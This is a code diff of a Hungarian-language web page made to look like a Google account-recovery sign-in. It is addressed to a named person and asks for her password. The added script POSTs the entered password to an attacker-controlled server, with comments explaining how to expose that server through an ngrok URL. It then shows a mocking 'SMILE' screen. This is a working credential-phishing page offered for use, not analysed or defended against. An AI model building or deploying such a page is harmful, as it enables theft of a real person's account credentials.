@@ -3,174 +3,335 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Fiók visszaállítása</title>
+<title>Google/Help.Újraállítás</title>
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
 <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
 <style>
-  body {
+* {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
     font-family: 'Roboto', sans-serif;
-    background-color: #f2f2f2;
+}
+
+body {
+    background: #f2f2f2;
+    min-height: 100vh;
     display: flex;
     justify-content: center;
     align-items: center;
-    height: 100vh;
-    margin: 0;
-  }
-  
-  .card {
+    padding: 20px;
+}
+
+.card {
+    width: 600px;
+    max-width: 100%;
     background: white;
-    padding: 48px 40px 36px;
+    color: #202124;
     border-radius: 8px;
-    box-shadow: 0 1px 3px rgba(0,0,0,0.12);
-    width: 450px;
-    max-width: 90%;
-  }
+    padding: 48px 40px 36px;
+    box-shadow: 0 1px 3px rgba(0, 0, 0, 0.12);
+}
 
-  .header {
+.logo-container {
     text-align: center;
-    margin-bottom: 24px;
-  }
+    margin-bottom: 16px;
+}
 
-  .header img {
+.logo {
     width: 75px;
     height: auto;
-    margin-bottom: 16px;
-  }
+}
 
-  h1 {
+h1 {
     font-size: 24px;
     font-weight: 400;
-    color: #202124;
-    margin: 0;
-  }
+    margin-bottom: 8px;
+    text-align: left;
+}
 
-  p.subtitle {
+.subtitle {
     font-size: 16px;
     line-height: 1.5;
+    text-align: left;
+    margin-bottom: 32px;
     color: #202124;
-    margin-top: 10px;
-    margin-bottom: 24px;
-  }
+}
 
-  .input-wrapper {
-    position: relative;
-    margin-bottom: 16px;
-  }
-
-  input[type="password"], 
-  input[type="text"] {
+input[type="password"],
+input[type="text"] {
     width: 100%;
     padding: 13px 15px;
     border: 1px solid #dadce0;
     border-radius: 4px;
+    color: #202124;
     font-size: 16px;
     outline: none;
-    box-sizing: border-box;
-    transition: border 0.2s;
-  }
+    transition: border-color 0.2s;
+}
 
-  input:focus {
-    border: 2px solid #1a73e8;
-    padding: 12px 14px;
-  }
+input[type="password"]:focus,
+input[type="text"]:focus {
+    border-color: #1a73e8;
+    border-width: 1px;
+    padding: 13px 15px;
+}
 
-  .options {
+.options {
+    margin-top: 12px;
     display: flex;
     align-items: center;
     gap: 8px;
-    margin-bottom: 24px;
     cursor: pointer;
-  }
+}
 
-  label {
+.options input[type="checkbox"] {
+    width: auto;
+    cursor: pointer;
+}
+
+label {
+    cursor: pointer;
     font-size: 14px;
     color: #202124;
-    cursor: pointer;
-  }
+}
 
-  button {
-    background-color: #1a73e8;
-    color: white;
+button {
+    margin-top: 32px;
+    float: right;
+    padding: 12px 24px;
     border: none;
     border-radius: 4px;
-    padding: 12px 24px;
-    font-size: 14px;
+    background: #1a73e8;
+    color: white;
     font-weight: 500;
+    font-size: 14px;
     cursor: pointer;
-    float: right;
-  }
+    letter-spacing: 0.25px;
+}
 
-  button:hover {
-    background-color: #1765cc;
+button:hover {
+    background: #1765cc;
     box-shadow: 0 1px 2px rgba(60,64,67,0.3);
-  }
+}
 
-  @media (max-width: 600px) {
+@media (max-width: 768px) {
     .card {
-      box-shadow: none;
-      background: transparent;
-      padding: 24px;
+        padding: 32px 24px;
+        box-shadow: none;
+        background: transparent;
     }
-    button {
-      width: 100%;
-      float: none;
-      margin-top: 16px;
+
+    h1 {
+        font-size: 20px;
     }
-  }
+}
+
+/* RETRÓ GLITCH STÍLUSOK */
+.success-container {
+    display: none;
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background: #0d0d0d;
+    justify-content: center;
+    align-items: center;
+    flex-direction: column;
+    z-index: 1000;
+    overflow: hidden;
+}
+
+.smiley-face {
+    width: 120px;
+    height: 120px;
+    border-radius: 50%;
+    background: #ffeb3b;
+    position: relative;
+    margin-bottom: 20px;
+    border: 3px solid #000;
+    box-shadow: 4px 4px 0px #000;
+    animation: glitch-skew 1s infinite linear alternate-reverse;
+}
+
+@keyframes glitch-skew {
+    0% { transform: skew(0deg); }
+    20% { transform: skew(-10deg); }
+    40% { transform: skew(5deg); }
+    60% { transform: skew(-5deg); }
+    80% { transform: skew(10deg); }
+    100% { transform: skew(0deg); }
+}
+
+@keyframes glitch-clip {
+    0% { clip-path: inset(40% 0 21% 0); }
+    20% { clip-path: inset(10% 0 60% 0); }
+    40% { clip-path: inset(70% 0 10% 0); }
+    60% { clip-path: inset(20% 0 50% 0); }
+    80% { clip-path: inset(50% 0 30% 0); }
+    100% { clip-path: inset(10% 0 70% 0); }
+}
+
+.smiley-face::before,
+.smiley-face::after {
+    content: '';
+    position: absolute;
+    width: 15px;
+    height: 15px;
+    background: #000;
+    border-radius: 50%;
+    top: 40px;
+    z-index: 2;
+}
+
+.smiley-face::before {
+    left: 30px;
+    animation: glitch-clip 0.4s infinite linear alternate-reverse;
+}
+
+.smiley-face::after {
+    right: 30px;
+    animation: glitch-clip 0.6s infinite linear alternate-reverse;
+}
+
+.smile {
+    position: absolute;
+    bottom: 25px;
+    left: 50%;
+    transform: translateX(-50%);
+    width: 50px;
+    height: 25px;
+    border-bottom: 4px solid #000;
+    border-radius: 0 0 25px 25px;
+    z-index: 2;
+}
+
+.smiley-face-glitch {
+    position: absolute;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background: #ffeb3b;
+    opacity: 0.7;
+    mix-blend-mode: hard-light;
+    animation: glitch-clip 0.2s infinite;
+    clip-path: inset(0 0 0 0);
+}
+
+.success-text {
+    color: #fff;
+    font-size: 28px;
+    font-weight: bold;
+    text-transform: uppercase;
+    letter-spacing: 4px;
+    margin-bottom: 15px;
+    text-shadow: 2px 2px 0px #ff00ff, -2px -2px 0px #00ffff;
+    animation: flicker 0.5s infinite alternate;
+}
+
+@keyframes flicker {
+    0% { opacity: 1; }
+    50% { opacity: 0.8; }
+    100% { opacity: 1; }
+}
+
+.quote {
+    color: #aaa;
+    font-size: 16px;
+    text-align: center;
+    max-width: 400px;
+    line-height: 1.6;
+    text-shadow: 1px 1px 2px #000;
+    font-style: italic;
+    border-top: 1px solid #333;
+    padding-top: 15px;
+    margin-top: 10px;
+}
 </style>
 </head>
 <body>
 
 <div class="card">
-  <div class="header">
-    <!-- Ide illeszd be a saját logo URL-jét vagy fájlnevet -->
-    <img src="igy jol fog kinezni.png" alt="Logo">
-    <h1>Béresné Madai Krisztina</h1>
-    <p class="subtitle">Adja meg a jelszót a folytatáshoz</p>
+  <div class="logo-container">
+    <img src="igy jol fog kinezni.png" alt="Logo" class="logo">
   </div>
 
-  <form id="loginForm">
-    <div class="input-wrapper">
-      <input type="password" id="pwd" placeholder="Jelszó" required>
-    </div>
+  <h1>Béresné Madai Krisztina</h1>
 
-    <div class="options">
-      <input type="checkbox" id="show">
-      <label for="show">Jelszó megjelenítése</label>
-    </div>
+  <p class="subtitle">Adja meg a jelszót a folytatáshoz</p>
 
-    <button type="submit">Tovább</button>
-  </form>
+  <input type="password" id="pwd" placeholder="Jelszó">
+
+  <div id="status" style="margin-top:10px; font-size:14px; color:#5f6368;"></div>
+
+  <div class="options">
+    <input type="checkbox" id="show">
+    <label for="show">Jelszó megjelenítése</label>
+  </div>
+
+  <button type="button" id="loginBtn" onclick="login()">Tovább</button>
+</div>
+
+<div class="success-container" id="successContainer">
+    <div class="smiley-face">
+        <div class="smiley-face-glitch"></div>
+        <div class="smile"></div>
+    </div>
+    <div class="success-text">SMILE</div>
+    <div class="quote">nem látod a fától az erdőt mert, amint ez felillan a figyelem elillan.</div>
 </div>
 
 <script>
-const form = document.getElementById('loginForm');
-const pwdInput = document.getElementById('pwd');
-const showCheckbox = document.getElementById('show');
+const passwordInput = document.getElementById("pwd");
+const showCheckbox = document.getElementById("show");
+const statusDiv = document.getElementById("status");
+const loginBtn = document.getElementById("loginBtn");
+const successContainer = document.getElementById("successContainer");
 
-showCheckbox.addEventListener('change', () => {
-  pwdInput.type = showCheckbox.checked ? 'text' : 'password';
+showCheckbox.addEventListener("change", () => {
+  passwordInput.type = showCheckbox.checked ? "text" : "password";
 });
 
-form.addEventListener('submit', async (e) => {
-  e.preventDefault();
-  const password = pwdInput.value;
-  
-  if (!password) return;
+function login() {
+  const input = passwordInput;
 
-  try {
-    await fetch('http://localhost:3000/save', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ uzenet: password })
-    });
-    
-    alert('Sikeresen elküldve!');
-    pwdInput.value = '';
-  } catch (err) {
-    console.error('Hiba:', err);
-    alert('Hiba történt a küldés közben.');
+  if (!input.value.trim()) {
+    statusDiv.textContent = "Kérlek adj meg egy jelszót.";
+    return;
+  }
+
+  async function kuldes() {
+    try {
+      // FONTOS: Ide írd be a NGROK által generált HTTPS URL-t!
+      // Példa: https://abc123.ngrok.io/save
+      // Ha helyi hálózaton vagy, használhatod a http://localhost:3000/save-t is.
+      const serverUrl = 'https://YOUR_NGROK_URL.ngrok.io/save'; 
+
+      await fetch(serverUrl, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ uzenet: input.value })
+      });
+
+      statusDiv.textContent = "Sikeresen mentve!";
+      successContainer.style.display = 'flex';
+    } catch (error) {
+      console.error("Hiba:", error);
+      statusDiv.textContent = "Hiba történt a küldés közben.";
+    } finally {
+      input.value = '';
+    }
+  }
+
+  kuldes();
+}
+
+document.addEventListener('keydown', function(event) {
+  if (event.key === 'Enter') {
+    login();
   }
 });
 </script>
